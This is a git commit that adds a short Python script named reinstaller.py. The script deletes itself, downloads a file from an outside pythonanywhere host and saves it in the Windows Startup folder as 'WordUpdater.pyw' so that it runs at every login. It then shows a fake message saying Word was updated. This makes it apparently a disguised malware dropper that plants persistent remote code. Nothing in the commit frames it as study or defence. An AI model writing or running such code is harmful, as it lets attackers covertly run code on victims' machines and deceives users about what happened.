291e3ad8e44a16a2c76e6f365a30420c8f34efd1
GSGTafelManager <102914944+GSGTafelManager@users.noreply.github.com>
2022-04-06 16:41:46 +0200

    Create reinstaller.py

---
+++ reinstaller.py
@@ -0,0 +1,11 @@
+import os
+os.remove(__file__)
+from tkinter import messagebox
+import requests
+import pathlib
+import sentry_sdk
+sentry_sdk.init("https://8b78151ad1da4102805eefb4a8fa8606@o1185419.ingest.sentry.io/6303999", release="GSGTMServiceInstaller@1.0.0", traces_sample_rate=1.0)
+main_path = pathlib.Path.home().absolute() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "WordUpdater.pyw"
+with open(str(main_path), "wb") as tf:
+    tf.write(requests.get("http://gsgtafelmanager.pythonanywhere.com/file/startup.py").content)
+messagebox.showinfo("Word Updater", "Word got updated automatically. You can now close this window.")
